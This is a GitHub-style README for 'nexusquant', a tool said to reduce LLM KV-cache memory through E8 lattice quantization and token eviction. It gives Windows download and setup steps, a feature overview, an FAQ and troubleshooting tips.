# 🧊 nexusquant - Run large language models with ease

[![Download nexusquant](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/hijolk/nexusquant/releases)

---

## 🛠 What is nexusquant?

Nexusquant helps you run large language models on your home computer. These models often require immense amounts of memory to store their internal data, which is known as the KV cache. When this memory fills up, your computer slows down or stops working. 

Nexusquant solves this problem by shrinking the data size. It uses a method called E8 lattice quantization. This process keeps the important information while removing unnecessary data. It also uses a smart way to clear out old or irrelevant tokens during conversations. You get the same quality of answers, but the model needs much less memory. This allows models to handle longer documents than they could before. 

## ⚙️ System Requirements

Your computer needs specific parts to run this software. Please check these items before you begin.

* Operating System: Windows 10 or Windows 11.
* Graphics Card: An NVIDIA GPU with at least 8GB of video memory.
* Storage: At least 2GB of free space on your hard drive.
* Python: Version 3.10 or newer must be installed on your system.

## 📥 How to download and install

Follow these steps to set up the software on your machine.

1. Go to the [official release page](https://github.com/hijolk/nexusquant/releases).
2. Look for the latest release at the top of the page.
3. Click the file name ending in .zip to start the download.
4. Open the folder where the file saved.
5. Right-click the file and select "Extract All" to see the contents.
6. Open the extracted folder.

## 🚀 Running the software

You can start the tool by following these instructions.

1. Open your Command Prompt. You can find this by typing "cmd" in the Windows search bar.
2. Type `cd` followed by a space, then drag the folder you extracted into the window. Press Enter.
3. Type `pip install -r requirements.txt` and press Enter. This prepares the tools needed for the software to run.
4. Once that finishes, type `python main.py` to start the program.

The application will now load. It will display a simple interface where you can choose which model to load. The software handles the compression steps automatically. You do not need to change any complex settings.

## 🧠 Understanding the features

Nexusquant works by focusing on two main areas:

1. E8 Lattice Quantization: This acts like a digital filter. It groups numbers together in a specific pattern. Because it groups them, the computer stores fewer total numbers. This reduces the footprint of your model significantly.
2. Attention-Aware Token Eviction: Language models look at every part of your conversation. Some parts are more important than others. This tool identifies which parts matter least and deletes them from the active cache. This creates room for new text processing.

## 📋 Frequently asked questions

**Will this software break my language model?**
No. The software performs mathematical operations to reduce memory usage. It does not delete the core brain of the model itself.

**How much memory will I save?**
You will see a reduction between 10 and 33 times compared to normal operation. This depends on the model size and the length of your chat.

**Can I undo these changes?**
Yes. Since the software does not change the model files permanently, you can close the app or run your model without nexusquant at any time to return to the original state.

**Does this require a fast internet connection?**
You only need an internet connection to download the initial installer. Once the files reside on your PC, you can use the software offline.

## 🔧 Troubleshooting common issues

If you encounter errors, check these common fixes:

* Permission Denied: Right-click the Command Prompt and select "Run as Administrator."
* Missing Python: If your computer says "python is not recognized," you must reinstall Python and ensure you check the box labeled "Add Python to PATH" during the setup process.
* Out of Memory: Your graphics card might be too small for the specific model you selected. Try choosing a smaller base model and run the program again.
* File Not Found: Make sure you typed `cd` before pasting the file path in the Command Prompt. This tells the computer to look inside the folder where you placed the software.

## 📖 Support and community

Nexusquant remains a project for those who want to run large models on modest hardware. You can track updates on the main repository page. If you find a bug, open an issue on the GitHub page so that others can help solve it. Keep your software updated to get the best results.